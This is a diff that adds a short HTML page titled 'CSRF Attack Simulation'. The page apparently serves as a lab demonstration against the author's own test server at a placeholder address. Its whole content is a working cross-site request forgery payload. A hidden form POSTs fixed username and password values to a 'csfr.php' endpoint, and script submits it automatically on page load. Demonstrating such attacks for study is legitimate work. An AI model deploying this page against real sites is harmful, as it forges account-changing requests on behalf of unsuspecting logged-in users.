@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Simulation</title>
+</head>
+<body onload="autoSubmitForm()">
+    <h2>Forging request...</h2>
+
+    <form id="forgedForm" action="http://your_droplet_ip/csfr.php" method="POST">
+        <input type="hidden" name="username" value="host">
+        <input type="hidden" name="password" value="pass">
+    </form>
+
+    <script>
+        function autoSubmitForm() {
+            document.getElementById('forgedForm').submit();
+        }
+    </script>
+</body>
+</html>
